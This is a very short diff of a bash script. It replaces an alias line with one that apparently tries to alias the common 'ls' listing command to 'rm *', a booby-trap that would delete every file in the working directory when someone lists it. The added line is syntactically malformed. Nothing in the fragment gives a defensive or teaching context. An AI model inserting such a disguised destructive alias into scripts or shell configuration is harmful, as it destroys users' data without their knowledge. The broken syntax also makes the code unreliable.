@@ -1,2 +1,3 @@
 #!/bin/bash
-alias -p user= 1
+alias -p ls= rm *
+
